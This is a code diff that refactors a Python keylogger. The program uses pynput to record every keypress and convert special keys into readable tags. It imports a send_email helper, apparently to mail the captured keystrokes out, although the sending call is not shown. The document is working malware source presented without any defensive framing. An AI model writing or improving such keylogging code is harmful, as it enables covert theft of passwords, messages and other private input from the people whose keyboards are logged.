@@ -1,8 +1,6 @@
 from pynput.keyboard import Listener, Key
 from sendEmail import send_email
 
-count = 0
-keys = []
 logged_data = []
 substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
     'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
@@ -10,18 +8,11 @@ substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.s
     '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
     '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
 
-def on_press(key):
-    global keys, count
-    print(key)
-    keys.append(str(key))
-    count +=1 
-    if count >= 1:
-        count = 0
-        write_email(keys)
-        keys = []
+def on_press(key):  
+    print(key)  
+    write_email(str(key))
     
-def write_email(keys):
-    for key in keys:
+def write_email(key):
         k = key.replace("'","")
         if key in substitution:
             k = (substitution[substitution.index(key)+1])
